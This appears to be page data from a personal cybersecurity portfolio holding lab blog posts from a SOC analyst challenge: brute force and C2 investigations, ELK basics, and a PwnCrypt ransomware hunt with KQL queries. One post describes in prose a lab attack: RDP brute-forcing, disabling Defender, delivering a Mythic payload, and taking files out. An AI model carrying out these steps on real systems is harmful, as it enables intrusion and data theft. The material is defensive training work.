1:"$Sreact.fragment"
2:I[9304,["542","static/chunks/542-9c169102c7286aba.js","651","static/chunks/651-e2b53cfd6ab14c6d.js","838","static/chunks/838-83c262eea6b250cb.js","52","static/chunks/52-dc2ebebf60073ec5.js","309","static/chunks/309-3e43f9b66d438df9.js","945","static/chunks/945-2a14fe9ed70b235a.js","916","static/chunks/916-d000ae8515890a43.js","794","static/chunks/794-40a14984f3a6b1a7.js","177","static/chunks/app/layout-020809086aa700bb.js"],"ThemeProvider"]
3:I[9241,["542","static/chunks/542-9c169102c7286aba.js","651","static/chunks/651-e2b53cfd6ab14c6d.js","838","static/chunks/838-83c262eea6b250cb.js","52","static/chunks/52-dc2ebebf60073ec5.js","309","static/chunks/309-3e43f9b66d438df9.js","945","static/chunks/945-2a14fe9ed70b235a.js","916","static/chunks/916-d000ae8515890a43.js","794","static/chunks/794-40a14984f3a6b1a7.js","177","static/chunks/app/layout-020809086aa700bb.js"],"CyberHeader"]
4:I[7555,[],""]
5:I[1295,[],""]
6:I[1024,["542","static/chunks/542-9c169102c7286aba.js","838","static/chunks/838-83c262eea6b250cb.js","345","static/chunks/app/not-found-f26a84874965db45.js"],"default"]
7:I[3063,["542","static/chunks/542-9c169102c7286aba.js","651","static/chunks/651-e2b53cfd6ab14c6d.js","838","static/chunks/838-83c262eea6b250cb.js","52","static/chunks/52-dc2ebebf60073ec5.js","309","static/chunks/309-3e43f9b66d438df9.js","945","static/chunks/945-2a14fe9ed70b235a.js","916","static/chunks/916-d000ae8515890a43.js","794","static/chunks/794-40a14984f3a6b1a7.js","177","static/chunks/app/layout-020809086aa700bb.js"],"Image"]
8:I[6874,["542","static/chunks/542-9c169102c7286aba.js","651","static/chunks/651-e2b53cfd6ab14c6d.js","838","static/chunks/838-83c262eea6b250cb.js","52","static/chunks/52-dc2ebebf60073ec5.js","309","static/chunks/309-3e43f9b66d438df9.js","945","static/chunks/945-2a14fe9ed70b235a.js","916","static/chunks/916-d000ae8515890a43.js","794","static/chunks/794-40a14984f3a6b1a7.js","177","static/chunks/app/layout-020809086aa700bb.js"],""]
a:I[9665,[],"OutletBoundary"]
d:I[9665,[],"ViewportBoundary"]
f:I[9665,[],"MetadataBoundary"]
11:I[6614,[],""]
:HL["/_next/static/css/9771aacc16142aba.css","style"]
:HL["/_next/static/css/b5c3a1bf19425f6c.css","style"]
0:{"P":null,"b":"gB8xjAs73Ya8I_-QXZr5a","p":"","c":["","projects","30-day-soc-analyst-challenge-part27",""],"i":false,"f":[[["",{"children":["projects",{"children":[["slug","30-day-soc-analyst-challenge-part27","d"],{"children":["__PAGE__",{}]}]}]},"$undefined","$undefined",true],["",["$","$1","c",{"children":[[["$","link","0",{"rel":"stylesheet","href":"/_next/static/css/9771aacc16142aba.css","precedence":"next","crossOrigin":"$undefined","nonce":"$undefined"}],["$","link","1",{"rel":"stylesheet","href":"/_next/static/css/b5c3a1bf19425f6c.css","precedence":"next","crossOrigin":"$undefined","nonce":"$undefined"}]],["$","html",null,{"lang":"en","suppressHydrationWarning":true,"children":[["$","head",null,{"children":["$","script",null,{"defer":true,"src":"https://cloud.umami.is/script.js","data-website-id":"1c0f224c-1fe0-4093-a4e2-c43cb8c84bfa"}]}],["$","body",null,{"className":"__className_f367f3","children":["$","$L2",null,{"attribute":"class","defaultTheme":"light","disableTransitionOnChange":true,"children":["$","div",null,{"className":"flex min-h-screen flex-col","children":[["$","$L3",null,{}],["$","main",null,{"className":"flex-1 pt-16","children":["$","$L4",null,{"parallelRouterKey":"children","error":"$undefined","errorStyles":"$undefined","errorScripts":"$undefined","template":["$","$L5",null,{}],"templateStyles":"$undefined","templateScripts":"$undefined","notFound":[["$","$L6",null,{}],[]],"forbidden":"$undefined","unauthorized":"$undefined"}]}],["$","footer",null,{"className":"bg-background py-5 border-t border-border","children":["$","div",null,{"className":"container mx-auto px-4 md:px-6","children":[["$","div",null,{"className":"grid grid-cols-1 md:grid-cols-3 gap-4","children":[["$","div",null,{"className":"space-y-2","children":[["$","div",null,{"className":"flex items-center","children":["$","div",null,{"className":"relative w-[3.6rem] h-[3.6rem]","children":["$","$L7",null,{"src":"https://hebbkx1anhila5yf.public.blob.vercel-storage.com/117%20Corporation%20no%20bg-5VVBXF0igK8jcCo43su7cpA2isco7t.png","alt":"117 SECOPS Logo","fill":true,"className":"object-contain"}]}]}],["$","p",null,{"className":"text-sm text-muted-foreground max-w-xs","children":"Cybersecurity professional specializing in protecting digital assets from evolving threats."}],["$","div",null,{"className":"pt-0","children":["$","a",null,{"href":"https://www.linkedin.com/in/otori-samson/","target":"_blank","rel":"noopener noreferrer","children":"Contact Me","className":"inline-flex items-center justify-center whitespace-nowrap text-sm font-medium ring-offset-background transition-colors focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 h-9 rounded-md px-3 cyber-border bg-transparent text-foreground hover:bg-purple-600 hover:text-white","ref":null}]}]]}],["$","div",null,{"children":[["$","h3",null,{"className":"font-medium text-sm mb-2 text-foreground","children":"Quick Links"}],["$","ul",null,{"className":"space-y-0.5","children":[["$","li",null,{"children":["$","$L8",null,{"href":"/","className":"text-sm text-muted-foreground hover:text-primary","children":"Home"}]}],["$","li",null,{"children":["$","$L8",null,{"href":"/blog","className":"text-sm text-muted-foreground hover:text-primary","children":"Blog"}]}],["$","li",null,{"children":["$","$L8",null,{"href":"/projects","className":"text-sm text-muted-foreground hover:text-primary","children":"Projects"}]}],["$","li",null,{"children":["$","$L8",null,{"href":"/portfolio","className":"text-sm text-muted-foreground hover:text-primary","children":"Portfolio"}]}],["$","li",null,{"children":["$","$L8",null,{"href":"/about","className":"text-sm text-muted-foreground hover:text-primary","children":"About"}]}]]}]]}],["$","div",null,{"children":[["$","h3",null,{"className":"font-medium text-sm mb-2 text-foreground","children":"Areas of Expertise"}],["$","ul",null,{"className":"space-y-0.5","children":[["$","li",null,{"className":"text-sm text-muted-foreground","children":"Security Assessment"}],["$","li",null,{"className":"text-sm text-muted-foreground","children":"Penetration Testing"}],["$","li",null,{"className":"text-sm text-muted-foreground","children":"Secure Development"}],["$","li",null,{"className":"text-sm text-muted-foreground","children":"Incident Response"}],["$","li",null,{"className":"text-sm text-muted-foreground","children":"Compliance"}]]}]]}]]}],["$","div",null,{"className":"border-t border-border mt-5 pt-3 flex flex-col md:flex-row justify-between items-center","children":["$","p",null,{"className":"text-sm text-muted-foreground","children":["Â© ",2025," Samson's. Personal cybersecurity portfolio."]}]}]]}]}]]}]}]}]]}]]}],{"children":["projects",["$","$1","c",{"children":[null,["$","$L4",null,{"parallelRouterKey":"children","error":"$undefined","errorStyles":"$undefined","errorScripts":"$undefined","template":["$","$L5",null,{}],"templateStyles":"$undefined","templateScripts":"$undefined","notFound":"$undefined","forbidden":"$undefined","unauthorized":"$undefined"}]]}],{"children":[["slug","30-day-soc-analyst-challenge-part27","d"],["$","$1","c",{"children":[null,["$","$L4",null,{"parallelRouterKey":"children","error":"$undefined","errorStyles":"$undefined","errorScripts":"$undefined","template":["$","$L5",null,{}],"templateStyles":"$undefined","templateScripts":"$undefined","notFound":"$undefined","forbidden":"$undefined","unauthorized":"$undefined"}]]}],{"children":["__PAGE__",["$","$1","c",{"children":["$L9","$undefined",null,["$","$La",null,{"children":["$Lb","$Lc",null]}]]}],{},null,false]},null,false]},null,false]},null,false],["$","$1","h",{"children":[null,["$","$1","VXgtNk6V6mmyGrfOclnQN",{"children":[["$","$Ld",null,{"children":"$Le"}],null]}],["$","$Lf",null,{"children":"$L10"}]]}],false]],"m":"$undefined","G":["$11","$undefined"],"s":false,"S":true}
12:I[2238,["542","static/chunks/542-9c169102c7286aba.js","651","static/chunks/651-e2b53cfd6ab14c6d.js","838","static/chunks/838-83c262eea6b250cb.js","885","static/chunks/885-ced1f1eec30031e3.js","150","static/chunks/150-f30d5c80752f43a9.js","419","static/chunks/app/projects/%5Bslug%5D/page-e7fed7e0529d1ffc.js"],"default"]
13:Tca8,
## Day 27 of the 30-Day MYDFIR SOC Analyst Challenge: Investigating an RDP Brute Force Attack

## Overview

On Day 27 of my 30-Day MYDFIR SOC Analyst Challenge, I shifted focus to investigating an RDP brute force attack alert. The process follows a similar methodology to investigating an SSH brute force attack, with the only major difference being the protocol in question. Here's how I broke it down.

## Reviewing the Alert

I started by navigating to the alerts section in my web interface, filtering for RDP brute force alerts. Out of 327 total alerts, I found 5 related to RDP brute force. I selected one of the alerts and also took note of the source IP, which had a username attempt of "administrator." There were 5 events in total, so I dug deeper into the details.

## Automating Ticket Creation in OS Ticket

Because I had already set up an automated ticket creation system for SSH brute force alerts, I decided to replicate the process for this RDP alert. Using the existing SSH rule, I copied the webhook details and applied them to the RDP brute force rule. This allowed me to automatically generate a ticket within OS Ticket whenever an RDP brute force attack is detected.

## Investigating the IP Address

For the next steps, I wanted to gather more information about the attacking IP address. First, I used AbuseIPDB, which revealed that the IP had been reported 71 times, with a 63% confidence score of malicious activity, mostly relating to RDP brute force attempts. Then, I checked GreyNoise, which classified the IP as "unknown intent," meaning it was engaged in internet-wide scanning but not specifically targeting my environment. This data gave me enough confidence to mark the IP as associated with RDP brute force activity.

## Analyzing for Affected Users

I next wanted to see if any other users were targeted by the attacker. After filtering my logs for the past 30 days, I found 271 events related to this IP, but all of them were focused on the "administrator" account. This confirmed that no other user accounts had been affected.

## Checking for Successful Logins

A crucial part of any brute force investigation is determining whether the attacker was successful. In this case, I looked for Windows event code 4624, which indicates a successful login. Fortunately, there were no successful authentication attempts from this IP address, so I could confirm that the attack had failed.

## Conclusion

Even though there were no successful logins in this case, the investigation served as a good reminder of the importance of thorough log review and automated alerting. In the next step of this challenge, I'll be diving deeper into another investigation, this time analyzing activity from the Mythic C2 agent. Stay tuned for more insights!

Here's the link to follow along: [30-Day MYDFIR SOC Analyst Challenge](https://www.youtube.com/watch?v=l9KA6dPdOs8&list=PLG6KGSNK4PuBWmX9NykU0wnWamjxdKhDJ&index=54)

*Credit: This project was originally created by the MYDFIR YouTube channel. All structure and content was inspired by MYDFIR. Check his channel out: [@MyDFIR](https://www.youtube.com/@MyDFIR)*

#CyberSecurity #SOCAnalyst #MYDFIRChallenge #HandsOnExperience #Day27 14:Tc6a,
## Day 26 of the 30-Day MyDFIR SOC Analyst Challenge: Investigating an SSH Brute Force Alert

## Overview

On Day 26 of the 30-Day MyDFIR SOC Analyst Challenge, I focused on investigating an SSH Brute Force alert, which is a common attack that tries to gain unauthorized access to a server by repeatedly guessing login credentials. This was a great opportunity to apply some detection tools I've set up throughout this challenge.

## Investigating the SSH Brute Force Alert

The first step in my investigation was to navigate to the "Alerts" section in Kibana under the security tab. I had several alerts, so I selected the most recent one, which occurred on September 17th. This alert flagged multiple failed login attempts to the root account from a specific IP address. The next step was to investigate the context behind this alert and understand whether this was a serious threat or just background noise.

## Checking the IP Address Reputation

To determine if the IP address in question was known for malicious activity, I used AbuseIPDB, a reliable source for checking the reputation of IP addresses. Sure enough, the IP had been flagged for abusive behavior over 2000 times, and the reports highlighted failed password attempts, indicating brute-force activity. I also turned to GreyNoise, which further confirmed that the IP was malicious, labeling it as an SSH brute-forcer and showing associated tags for malicious behavior. This gave me enough confidence to mark the IP as a known attacker.

## Analyzing Affected Users

Next, I needed to understand if the IP had targeted other users. I ran a query in Kibana to see the scope of the attack over the past 30 days. The results showed that the IP had attempted to brute force multiple users, including:
- Root account
- Oracle account
- Guest account
- Test accounts

Knowing which accounts were targeted helped me gauge the scale of the attack.

## Checking for Successful Logins

A critical step in the investigation was checking if any of the brute-force attempts had been successful. I searched the logs for successful login attempts but found none. This was a relief because, if successful, the attacker could have caused significant damage by executing commands or downloading malicious scripts.

## Conclusion

With no successful login attempts and the IP flagged as malicious, I felt confident in closing the alert. In a real-world environment, I would document all my findings in the ticketing system and follow up with any necessary changes to ensure similar alerts are handled promptly. This investigation helped reinforce my understanding of SSH brute-force attacks and the importance of monitoring for suspicious activity.

Here's the link to follow along: [30-Day MYDFIR SOC Analyst Challenge](https://www.youtube.com/watch?v=sXQ1hsAFX7U&list=PLG6KGSNK4PuBWmX9NykU0wnWamjxdKhDJ&index=53)

*Credit: This project was originally created by the MYDFIR YouTube channel. All structure and content was inspired by MYDFIR. Check his channel out: [@MyDFIR](https://www.youtube.com/@MyDFIR)*

#CyberSecurity #SOCAnalyst #MYDFIRChallenge #Day26 #HandsOnExperience #BruteForce 15:Tcfe,
## Day 28 of the 30-Day MyDFIR SOC Analyst Challenge: Investigating the Mythic C2 Framework

## Overview

On Day 28 of the 30-Day MyDFIR SOC Analyst Challenge, I shifted my focus to the Mythic Command and Control (C2) framework. Attackers widely use this framework to maintain control over compromised systems, allowing them to execute commands, steal data, and conduct other malicious activities without detection. My task was to investigate how the Mythic agent svchost_pilotvader.exe operated and how its communication could be detected.

## Tracing the Mythic C2 Agent

My investigation's first step was locating the Mythic C2 agent on one of the compromised systems. Armed with the knowledge of the agent's name, I used the Kibana Discover tool to search through the logs, narrowing the time range to the past 30 days. This allowed me to pinpoint 25 distinct events associated with the agent. Sorting these events chronologically, I was able to reconstruct the timeline of the agent's activity, gaining critical insight into how it interacted with the system over time.

## Identifying C2 Traffic Through Network Telemetry

In cases where the agent's name isn't known, identifying suspicious traffic can be challenging. Network telemetry analysis plays a critical role in detecting C2 activity. I began by analyzing network logs to identify the "top talkers"âthe machines that generated the most traffic. Since Mythic, like most C2 frameworks, relies on consistent communication between the infected host and the attacker's server, unusual traffic patterns often stand out.

To refine my detection, I utilized RITA (Real Intelligence Threat Analytics), a tool designed to detect beaconing behavior in C2 traffic. Beaconing occurs when an infected machine regularly checks in with a C2 server, and identifying these intervals allowed me to isolate Mythic's communication patterns. The detection of this regular network activity provided strong evidence of the C2 framework's presence.

## Investigating Process Creation Logs

Beyond network traffic, process creation analysis was essential for tracing the agent's activity. By examining these logs, I could see the exact processes initiated by the Mythic agent and track the attacker's movement within the system. These logs offer a detailed view of how the agent behaves, from its initial execution to spawning other processes critical to maintaining control over the system.

## Conclusion

Day 28's deep dive into the Mythic C2 framework offered valuable lessons in tracking adversary behavior. By leveraging network telemetry, beaconing detection, and process creation logs, I was able to uncover the activities of the Mythic agent and better understand its communication patterns. As the challenge nears its end, these investigations continue to hone my skills in threat detection and incident response.

Here's the link to follow along: [30-Day MYDFIR SOC Analyst Challenge](https://www.youtube.com/watch?v=b11TuDx_CjU&list=PLG6KGSNK4PuBWmX9NykU0wnWamjxdKhDJ&index=55)

*Credit: This project was originally created by the MYDFIR YouTube channel. All structure and content was inspired by MYDFIR. Check his channel out: [@MyDFIR](https://www.youtube.com/@MyDFIR)*

#CyberSecurity #SOCAnalyst #MYDFIRChallenge #HandsOnExperience #Day28 16:Tce2,
## Day 21 of the 30-Day MyDFIR SOC Analyst Challenge: Brute Force Attack & Establishing a C2 Session

## Overview

Today, I focused on executing a brute force attack, generating a Mythic agent, and establishing a Command and Control (C2) session on a Windows Server.

## Brute Force Attack on Windows Server

I started by connecting to the target Windows server via Remote Desktop Protocol (RDP). For this, I intentionally set a weak password on the server: Winter2024! This allowed me to simulate a typical scenario where an attacker might exploit weak credentials.

Next, I used the Crowbar tool on my Parrot OS machine to brute-force the RDP login. With the weak password added to a wordlist, I ran Crowbar, which quickly cracked the credentials. Using the recovered password, I accessed the server via xfreerdp, verifying the successful login by executing basic commands like Whoami and ipconfig.

## Disabling Windows Defender for Defense Evasion

Once inside the Windows server, my first task was to disable its defenses. I navigated to the Windows Security settings and manually turned off real-time protection along with other key security features.

## Generating the Mythic Agent

With the server exposed, I generated a Mythic C2 payload. Mythic is a popular Command and Control (C2) framework used by attackers to remotely control compromised systems. I installed the Apollo agent and the HTTP C2 Profile on my Mythic platform, customizing the settings to ensure the payload would effectively communicate back to my control server.

After setting up the Mythic agent, I created a Windows executable payload. This payload would be used to establish a persistent connection between the compromised server and the Mythic C2 server.

## Establishing the C2 Session

To deliver the payload to the Windows server, I used Python's http.server on port 9999 and PowerShell's Invoke-WebRequest to download it onto the target machine. Once the payload was executed on the server, it successfully connected to the Mythic C2 platform.

## Data Exfiltration

With full control established, I moved on to exfiltrate data. Specifically, I retrieved a file named passwords.txt from the server's Documents folder. Using the download command in Mythic, I successfully downloaded the file, confirming the presence of the weak password, Winter2024!

## Conclusion

I simulated a brute force attack, compromised a Windows server, and used Mythic to establish a C2 session for remote control and data exfiltration. This activity demonstrates the methods attackers use to infiltrate systems and the importance of maintaining strong security practices, such as enforcing complex passwords and securing endpoints.

Next, I'll focus on creating alerts and dashboards to detect Mythic activity and defend against similar attacks. Stay tuned!

Here's the link to follow along: [30-Day MYDFIR SOC Analyst Challenge](https://www.youtube.com/watch?v=85x0NLj2zUo&list=PLG6KGSNK4PuBWmX9NykU0wnWamjxdKhDJ&index=48)

*Credit: This project was originally created by the MYDFIR YouTube channel. All structure and content was inspired by MYDFIR. Check his channel out: [@MyDFIR](https://www.youtube.com/@MyDFIR)*

#CyberSecurity #SOCAnalyst #MYDFIRChallenge #HandsOnExperience #Day21 17:T4f0,
# Introduction to the 30-Days MYDFIR SOC Analyst Challenge

I'm thrilled to announce that I'll be taking on the 30-Days MYDFIR SOC Analyst Challenge! If you're like me, eager to gain hands-on experience in cybersecurity, this challenge is a perfect opportunity.

Over the next 30 days, I'll be learning how to set up and configure the ELK Stack, investigate security incidents, and create dashboards and alerts. Each week focuses on a specific skill, from brute force attack detection to setting up a C2 server.

This challenge is all about turning theory into practice, and by the end, I'll have honed the skills that are crucial for a SOC analyst role. I'll be sharing my progress and insights along the way, so stay tuned for updates.

Join me on this journey as I aim to strengthen my skills and prepare for the real-world demands of cybersecurity. Let's get started!

Here's the link to follow along: [30-Day MYDFIR SOC Analyst Challenge](https://www.youtube.com/watch?v=W3ExS2m6B24)

*Credit: This project was originally created by the MYDFIR YouTube channel. All structure and content was inspired by MYDFIR. Check his channel out: [@MyDFIR](https://www.youtube.com/@MyDFIR)*

#Cybersecurity #SOCAnalyst #30DayChallenge #PracticalExperience 18:Tb1f,
## Introduction

Today marks the beginning of my hands-on journey in the 30-Day MYDFIR SOC Analyst Challenge. I'm starting with the most fundamental aspect: creating a logical network diagram that will serve as the blueprint for my entire SOC environment.



## Environment Overview

At the heart of my SOC environment lies a carefully planned infrastructure consisting of six key servers. The core components include my Elastic Server for comprehensive log aggregation and analysis, paired with a Kibana Server that handles visualization and dashboard creation. To manage my agents effectively, I've incorporated a Fleet Server into the design. Additionally, a C2 Server has been included to facilitate realistic attack scenario simulations, alongside other supporting infrastructure components that complete my robust environment.

## Implementation Details

The implementation process began with draw.io as my diagramming tool of choice. Through careful consideration, I mapped out the complete environment with attention to detail. The process involved strategic placement of each server component within the network topology, ensuring optimal communication paths. I dedicated significant attention to configuring the private network structure and establishing clear data flow connections between components. Special consideration was given to defining security zones and boundaries, ensuring a secure and well-organized infrastructure.

## Key Insights

Through the process of creating this network diagram, I've gained valuable insights into the practical aspects of SOC architecture. Understanding how components interact within a security operations environment has proven crucial, as this setup mirrors real-world scenarios. The exercise has deepened my understanding of data flow patterns and the importance of comprehensive security monitoring coverage. This foundation will prove invaluable as I progress through the challenge.

## Future Direction

While this network diagram may appear straightforward, it represents the cornerstone of my 30-day journey. This blueprint will guide me through the configuration of monitoring tools, implementation of log forwarding mechanisms, and setup of alert management systems. As I progress, I'll use this foundation to simulate and detect security threats, turning theoretical knowledge into practical experience.

Here's the link to follow along: [30-Day MYDFIR SOC Analyst Challenge](https://www.youtube.com/watch?v=VAE3aVZi0Go&list=PLG6KGSNK4PuBWmX9NykU0wnWamjxdKhDJ&index=28)

*Credit: This project was originally created by the MYDFIR YouTube channel. All structure and content was inspired by MYDFIR. Check his channel out: [@MyDFIR](https://www.youtube.com/@MyDFIR)* 

#CyberSecurity #SOCAnalyst #MYDFIRChallenge #HandsOnExperience #MYDFIRChallenge #Day1 

19:Tb5a,
## Introduction

On Day 2 of the 30-Days MYDFIR SOC Analyst Challenge, I delved into the ELK stack, a powerful trio of toolsâElasticsearch, Logstash, and Kibanaâwidely used in security operations. Together, they form the backbone of log management and analysis, crucial for any Security Operations Center (SOC).

## Understanding Elasticsearch

Elasticsearch is the heart of the stack. It's a robust search engine that stores and indexes massive amounts of log data. This data can range from Windows event logs to firewall logs and beyond. What makes Elasticsearch particularly valuable is its querying power. It uses Elasticsearch Query Language (ESQL), which allows users to search through large datasets quickly and efficiently. The flexibility of Elasticsearch, especially with its RESTful APIs and JSON support, means you can programmatically interact with it from other tools, enhancing its integration into diverse environments.

## The Power of Logstash

Next is Logstash, the powerhouse that processes and transforms incoming data before feeding it into Elasticsearch. Logstash is vital because it allows you to refine your log data, filtering out unnecessary information and only retaining what's critical. This reduces the load on Elasticsearch and helps you manage storage costs more effectively. Additionally, Logstash's ability to parse log fields is a game-changer. For example, you can extract specific details from logs, such as IP addresses, and map them to fields that can be easily queried later. This capability is crucial for security analysts who need to drill down into specific events during investigations.

## Visualizing with Kibana

Finally, Kibana is the interface where all the magic happens. It provides a user-friendly web console for querying data stored in Elasticsearch. Beyond simple querying, Kibana's visualization tools enable the creation of detailed dashboards that can display trends, alert patterns, and more. These dashboards are not only useful for real-time monitoring but also for reporting to executives, who often rely on visual data to understand security posture.

## Conclusion

The ELK stack offers centralized logging, customizable data processing, and scalable architecture, making it an essential tool for SOC analysts. Its integration with various telemetry sources and the ability to create visualizations make it a powerful platform for both real-time monitoring and incident response.

Here's the link to follow along: [30-Day MYDFIR SOC Analyst Challenge](https://www.youtube.com/watch?v=4AwBhXAW90Q&list=PLG6KGSNK4PuBWmX9NykU0wnWamjxdKhDJ&index=29)

*Credit: This project was originally created by the MYDFIR YouTube channel. All structure and content was inspired by MYDFIR. Check his channel out: [@MyDFIR](https://www.youtube.com/@MyDFIR)*

#CyberSecurity #SOCAnalyst #MYDFIRChallenge #HandsOnExperience #Day2 1a:T2e31,
## Introduction

This investigation was conducted to examine suspicious file activity observed within the virtual machine samson-windows-, which was onboarded to Microsoft Defender for Endpoint (MDE). The objective was to determine whether abnormal file modification behaviour and ransom instructions on the desktop were the result of ransomware execution, and if so, to identify its origin, propagation chain, and indicators of compromise.

Using Microsoft Defender's advanced hunting capabilities, telemetry from multiple tables â DeviceFileEvents and DeviceProcessEvents â was analyzed to reconstruct the attack sequence.

## Scenario Overview

A new ransomware strain, internally referred to as PwnCrypt, had been reported as circulating in the wild. It leverages a PowerShell-based payload that encrypts local files using AES-256 encryption, appending the custom extension .pwncrypt. The strain also leaves ransom instructions in a desktop file demanding Bitcoin payment for decryption.

During lab testing, the same behaviour appeared on samson-windows-: three files on the Desktop were encrypted, and a text file appeared reading:

"Your files have been encrypted. To get a decryption key, send this amount of Bitcoin toâ¦"

The task was to confirm the root cause of this encryption, identify the executing process chain, and determine whether any persistence or lateral movement mechanisms were present.

## Preparation

Prior to the hunt, the samson-windows- VM was successfully onboarded to MDE, ensuring telemetry ingestion from endpoint sensors. A PowerShell script named pwncrypt.ps1 was executed in the background to simulate a real ransomware infection, but the analysis was performed as if the infection were unknown.

The first step was to establish a baseline of file activity to identify when the anomaly began.

## Data Collection

The analyst verified active log collection across Defender's telemetry tables. Using DeviceFileEvents, all file operations within the last 30 minutes were grouped by timestamp to visualize spikes in file write volume:

-------------------------------------------------------
kql
let VMName = "samson-windows-";
DeviceFileEvents
| where DeviceName == VMName
| where Timestamp >= ago(30m)
| summarize FileEvents = count() by bin(Timestamp, 5m)
| order by Timestamp asc
-------------------------------------------------------

Result: Three distinct spikes appeared within a short interval, suggesting a mass file modification event, the initial indicator of ransomware behavior.

## Data Analysis

### A. Mass File Modification and Extension Changes

To examine which file types were most affected, the following query was run:

-------------------------------------------------------
kql
DeviceFileEvents
| where DeviceName == VMName
| where ActionType in ("FileRenamed","FileCreated","FileModified")
| extend ext = tostring(split(FileName,".")[-1])
| summarize Count = count() by ext
| order by Count desc
-------------------------------------------------------

Observation: Extensions such as .dll, .mui, .xml, and .png appeared frequently normal for background Windows processes â but hidden within the logs were sudden surges of renamed files later correlated with the encryption timestamps.

### B. Folder-Level Analysis (Staging Behaviour)

To determine where encryption occurred:

-------------------------------------------------------
kql
let VMName = "samson-windows-";
DeviceFileEvents
| where DeviceName == VMName and Timestamp >= ago(30m)
| where ActionType == "FileCreated"
| summarize count() by Folder = extract(@"^(.*)\\[^\\]+$",1,FileName)
| order by count_ desc
-------------------------------------------------------

Result: High activity was isolated to a single user folder â C:\Users\samson\Desktop â confirming that encryption primarily targeted the Desktop directory.

### C. Identifying Script Execution

The next step was to look for evidence of any scripts or command-line interpreters responsible for the mass file actions:

-------------------------------------------------------
kql
let VMName = "samson-windows-";
DeviceProcessEvents
| where DeviceName == VMName and Timestamp >= ago(30m)
| where FileName has_any ("powershell","pwsh","cmd.exe","wscript.exe","cscript.exe","wmic.exe")
| project Timestamp, FileName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine
| order by Timestamp desc
-------------------------------------------------------

Result: Two instances of PowerShell.exe were identified, both launched non-interactively with the parameters:

ExecutionPolicy AllSigned -NoProfile -NonInteractive -Command "& {...}"

The initiator process was senseir.exe, a legitimate Windows background service that had been abused to execute PowerShell. This discovery confirmed that PowerShell was used to deploy or execute the encryption payload.

### D. Tracing Child Processes and Persistence Mechanisms

To verify what PowerShell spawned:

-------------------------------------------------------
kql
DeviceProcessEvents
| where DeviceName == VMName
| where InitiatingProcessFileName == "powershell.exe"
| project Timestamp, FileName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine
| order by Timestamp desc
-------------------------------------------------------

Result: PowerShell launched several cmd.exe and svchost.exe instances. These, in turn, executed processes such as python.exe, GameBarElevatedFT_Alias.exe, and MediaPlayer.exe, which were all generated within C:\Users\samson\AppData\Local\Temp â a common ransomware staging area.

### E. File Events Linked to User Folders

To focus on desktop encryption evidence:

-------------------------------------------------------
kql
let VMName = "samson-windows-";
DeviceFileEvents
| where DeviceName == VMName
| where Timestamp >= ago(24h)
| where ActionType in ("FileCreated","FileRenamed","FileModified")
| where FolderPath has_any("Desktop","\\Users\\")
| project Timestamp, ActionType, FileName, FolderPath, InitiatingProcessFileName
| order by Timestamp desc
-------------------------------------------------------

Result:

A file named __decryption-instructions.lnk appeared on the desktop immediately after hundreds of file renames and creations, confirming the delivery of the ransom note. The parent process was explorer.exe, which executed after system encryption had completed, a typical behaviour of ransomware scripts displaying ransom messages post-infection.

### F. Process Chain Correlation â Root Cause Determination

Finally, to reconstruct the infection path:

-------------------------------------------------------
kql
let VMName = "samson-windows-";
DeviceProcessEvents
| where DeviceName == VMName
| where Timestamp between (ago(120m) .. now())
| where FileName in~ ("powershell.exe","cmd.exe","services.exe","svchost.exe")
| project Timestamp, FileName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine, AccountName
| order by Timestamp asc
-------------------------------------------------------

Findings:

1. powershell.exe (initiated by senseir.exe) executed a hidden script with an AllSigned policy bypass.
2. This instance spawned cmd.exe, which registered background services.
3. services.exe then created multiple svchost.exe processes running under SYSTEM and Network Service accounts.
4. These service-hosted processes performed the encryption routines on user data.

<InlineGallery images={pwncrypt-ransomware-investigation} title="PwnCrypt Ransomware Investigation and Analysis Process" />

## Investigation Summary

The analysis confirmed that samson-windows- was infected with PwnCrypt ransomware delivered via a PowerShell payload. The encryption occurred under SYSTEM privileges, appending custom extensions to files and generating a ransom note on the desktop.

Execution Chain:
senseir.exe â powershell.exe â cmd.exe â services.exe â svchost.exe â file encryption (.pwncrypt)

## Response and Containment

1. Isolated the compromised VM from the network using Defender's Isolate Device function.
2. Conducted a full antivirus and Defender scan; confirmed malicious artifacts were limited to the VM.
3. Recommended a complete VM rebuild to remove any residual persistence.
4. Captured SHA-1 hashes of key malicious files (__decryption-instructions.lnk, encrypted files) for threat-intel reference.
5. Logged the incident for follow-up reporting to management and for potential YARA-rule creation.

## Documentation

Each phase of this investigation â preparation, data collection, analysis, and response â was recorded within Microsoft Defender's query history and screenshots for audit and learning purposes.

All queries were executed methodically to trace the incident from initial file-system anomalies to the responsible process hierarchy.

## MITRE ATT&CK Mapping

The PwnCrypt ransomware activity observed in samson-windows- aligns with several stages of the MITRE ATT&CK framework.

1. **Initial Access (T1204.002 â User Execution)**: Infection began through manual execution of a malicious PowerShell script.
2. **Execution (T1059.001 / T1059.003)**: PowerShell and CMD were used to run the payload and supporting commands.
3. **Persistence (T1543.003)**: New service-host processes were created to maintain execution.
4. **Privilege Escalation & Defense Evasion (T1569.002 / T1562.001 / T1036.005)**: Ransomware leveraged elevated service contexts, bypassed PowerShell policies, and masqueraded as legitimate Windows binaries.
5. **Discovery (T1082)**: Enumerated user directories such as C:\Users\samson\Desktop before encryption.
6. **Impact (T1486 / T1491.001)**: Encrypted user files with the .pwncrypt extension and dropped a ransom note (__decryption-instructions.lnk).

Overall, the attack followed a full ransomware kill chain â Execution â Persistence â Privilege Escalation â Defence Evasion â Impact â demonstrating how PowerShell abuse and service creation can rapidly lead to data encryption and ransom deployment.

## Improvement and Lessons Learned

1. **Restrict PowerShell usage**: Configure Constrained Language Mode and allow only signed scripts.
2. **Implement application whitelisting**: Block unauthorized interpreters (cmd.exe, powershell.exe, etc.) in user space.
3. **Monitor mass file modifications**: Create a detection rule for spikes in FileModified and FileRenamed actions per host.
4. **Enhance user awareness**: Ransomware often enters through phishing or drive-by downloads; continuous education is essential.
5. **Segment the network**: Prevent lateral propagation between machines by enforcing least-privilege access controls.

## Conclusion

The investigation conclusively determined that the observed encryption on samson-windows- was caused by the PwnCrypt ransomware, executed via a PowerShell-based payload with SYSTEM privileges.

Although contained within the lab environment, the event accurately simulated a real-world ransomware outbreak and demonstrated how rapid detection through telemetry correlation from file anomalies to process hierarchies enables timely containment.

